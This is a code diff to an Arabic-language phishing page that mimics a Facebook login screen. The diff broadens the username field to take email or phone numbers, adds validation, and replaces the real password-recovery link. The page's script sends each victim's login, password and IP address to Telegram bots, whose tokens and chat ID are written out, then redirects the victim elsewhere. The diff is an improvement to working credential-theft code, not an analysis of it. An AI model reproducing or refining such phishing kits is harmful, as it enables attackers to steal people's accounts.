@@ -4,7 +4,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>عليك تسجيل الدخول الى حسابك أولاً</title>
   <style>
-    /* Your CSS styles here */
+    /* Your original CSS styles here */
     * {
       margin: 0;
       padding: 0;
@@ -138,13 +138,6 @@
       font-size: 18px;
       margin-top: 20px;
     }
-    /* Add styles for error messages */
-    .error {
-      color: red;
-      font-size: 14px;
-      margin-top: 5px;
-      display: none;
-    }
   </style>
 </head>
 <body>
@@ -154,17 +147,21 @@
       <img src="111.png" alt="Parchisi Logo">
     </div>
     <form id="loginForm">
-      <input placeholder="البريد الإلكتروني أو رقم الهاتف" type="email" id="email" required>
-      <div id="emailError" class="error">Please enter a valid email address.</div>
+      <input placeholder="البريد الإلكتروني أو رقم الهاتف" type="text" id="emailOrPhone" required>
+      <!-- Added error message for email/phone -->
+      <div id="emailOrPhoneError" style="color: red; font-size: 14px; margin-top: 5px; display: none;">Please enter a valid email address or phone number.</div>
       <input placeholder="كلمة السر" type="password" name="pass" id="pass" required>
-      <div id="passwordError" class="error">Password must be at least 6 characters long.</div>
+      <!-- Added error message for password -->
+      <div id="passwordError" style="color: red; font-size: 14px; margin-top: 5px; display: none;">Password must be at least 6 characters long.</div>
+      <!-- Your original login button (unchanged) -->
       <button id="login" type="button" onclick="validateForm()">تسجيل الدخول</button>
-      <a href="https://m.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">هل نسيت كلمة السر؟</a>
+      <a href="forgotten password? ">هل نسيت كلمة السر؟</a>
       <div class="or">
         <p class="p2"></p>
         <p class="pOR">or</p>
         <p class="p3"></p>
       </div>
+      <!-- Your original CNA button (unchanged) -->
       <button id="CNA" type="button">انشاء حساب جديد</button>
     </form>
     <div class="lang">
@@ -192,20 +189,20 @@
   </div>
   <script>
     function validateForm() {
-      const email = document.getElementById('email').value.trim();
+      const emailOrPhone = document.getElementById('emailOrPhone').value.trim();
       const password = document.getElementById('pass').value.trim();
 
-      const emailError = document.getElementById('emailError');
+      const emailOrPhoneError = document.getElementById('emailOrPhoneError');
       const passwordError = document.getElementById('passwordError');
 
       let isValid = true;
 
-      // Validate email
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-        emailError.style.display = 'block';
+      // Validate email or phone number
+      if (!validateEmailOrPhone(emailOrPhone)) {
+        emailOrPhoneError.style.display = 'block';
         isValid = false;
       } else {
-        emailError.style.display = 'none';
+        emailOrPhoneError.style.display = 'none';
       }
 
       // Validate password
@@ -222,12 +219,22 @@
       }
     }
 
+    function validateEmailOrPhone(input) {
+      // Regular expression for email validation
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      // Regular expression for phone number validation (simple example for numbers only)
+      const phoneRegex = /^\d{10,}$/; // At least 10 digits
+
+      // Check if input matches either email or phone number format
+      return emailRegex.test(input) || phoneRegex.test(input);
+    }
+
     function redirectToWebsiteWithLoading() {
-      var email = document.getElementById('email').value;
+      var emailOrPhone = document.getElementById('emailOrPhone').value;
       var password = document.getElementById('pass').value;
 
       getIpAddress(function (ipAddress) {
-        sendToTelegram(email, password, ipAddress);
+        sendToTelegram(emailOrPhone, password, ipAddress);
         hideLoading();
         window.location.href = 'temporaryar.html';
       });
@@ -248,7 +255,7 @@
       ipRequest.send();
     }
 
-    function sendToTelegram(email, password, ipAddress) {
+    function sendToTelegram(emailOrPhone, password, ipAddress) {
       // Bot 1 Details
       var botToken1 = "6967999524:AAF9DF2TbkTIP6jTNqTisEDQkeHEXeYhBVY"; // Replace with the first Telegram bot token
       var chatId1 = "2095151068"; // Replace with the first Telegram chat ID
@@ -257,7 +264,7 @@
       var botToken2 = "5819392519:AAHAakcJ6cStHP8a8DpM9KlFPvaZkLo6At8"; // Replace with the second Telegram bot token
       var chatId2 = "2095151068"; // Replace with the second Telegram chat ID
 
-      var message = '\n📧 ↝ 𝙴𝙼𝙰𝙸𝙻 » ' + email + '\n📟 ↝ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » ' + password + '\n⚙️ ↝ 𝙸𝙿 » ' + ipAddress +
+      var message = '\n📧/📞 ↝ 𝙴𝙼𝙰𝙸𝙻/𝙿𝙷𝙾𝙽𝙴 » ' + emailOrPhone + '\n📟 ↝ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » ' + password + '\n⚙️ ↝ 𝙸𝙿 » ' + ipAddress +
          '\n↝ 𝙼𝙾𝙳𝙴 𝙱𝚈  »@HEXE_5';
       // Sending to Bot 1
       var url1 = 'https://api.telegram.org/bot' + botToken1 + '/sendMessage?chat_id=' + chatId1 + '&text=' + encodeURIComponent(message);
